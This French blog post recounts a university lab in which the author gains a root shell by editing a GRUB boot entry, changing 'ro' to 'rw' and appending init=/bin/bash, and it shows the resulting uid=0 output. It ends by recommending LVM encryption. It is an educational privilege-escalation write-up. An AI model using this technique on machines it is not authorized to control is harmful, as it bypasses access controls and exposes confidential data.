---
author: FreezingKas
title: L'élévation de privilèges la plus rapide sur GRUB
description: Dans ce billet, FreezingKas vous apprendra à élever vos privilèges sur un serveur à l'aide de GRUB.
slug: fastest-grub-privilege-escalation
date: 2023-03-24 00:00:00+0000
#lastUpdated: Jul 24, 2023 10:00 UTC
image: assets/grub.jpg
categories:
    - Privilege Escalation
tags:
    - Grub
    - System
    - Linux
---

# Privesc la plus rapide sur GRUB
## Contexte

Pendant le cours de sécurité des réseaux, j'ai eu un laboratoire avec sept serveurs sur un Proxmox créé par notre professeur sans utilisateur root.

Après avoir rapporté toutes les élévations de privilèges avec les commandes `sudo`, mon professeur a décidé de désactiver toutes les commandes `sudo` jusqu'à ce qu'il trouve une solution.

Malheureusement, cela n'a pas suffi.

## Privesc

Grub est un bootloader qui permet de choisir le système d'exploitation à démarrer.

Il était installé sur les serveurs, et je pouvais éditer des scripts de démarrage :

```bash
recordfail
load_video
gfxmode $linux_gfx_mode
insmod gzio
if [ x$grub_platform = xxen ] ; then insmod xzio ; insmod lzopio ; fi
insmod part_gpt
insmod ext2
search --no-floppy --fs-uuid --set=root <UUID>
linux /boot/vmlinuz-5.15.0-56-generic root=UUID=<UUID> ro quiet splash $vt_handoff
initrd /boot/initrd.img-5.15.0-56-generic
```

Dans notre cas, la LVM n'était pas chiffré, nous pouvions donc accéder aux fichiers en lançant un shell root :

```bash
linux /boot/vmlinuz-5.15.0-56-generic root=UUID=<UUID> ro quiet splash $vt_handoff
```

Remplacez simplement `ro` (read_only) par `rw` (read-write) et ajoutez init=/bin/bash à la fin de la ligne, puis redémarrez le serveur.

```bash
linux /boot/vmlinuz-5.15.0-56-generic root=UUID=<UUID> rw quiet splash $vt_handoff init=/bin/bash
```

Nous pouvons maintenant accéder à l'utilisateur root.

```bash
root@(none):/$ id
uid=0(root) gid=0(root) groups=0(root)
```

## Conclusion

Veuillez chiffrer vos LVM. Imaginez qu'il ne s'agisse pas d'un laboratoire, mais d'un ordinateur portable d'entreprise contenant des documents confidentiels.
Lorsque vous chiffrez les LVM, vous ne pouvez pas lire les fichiers lorsque vous changez `ro` en `rw` dans le fichier grub, une phrase d'authentification est nécessaire.
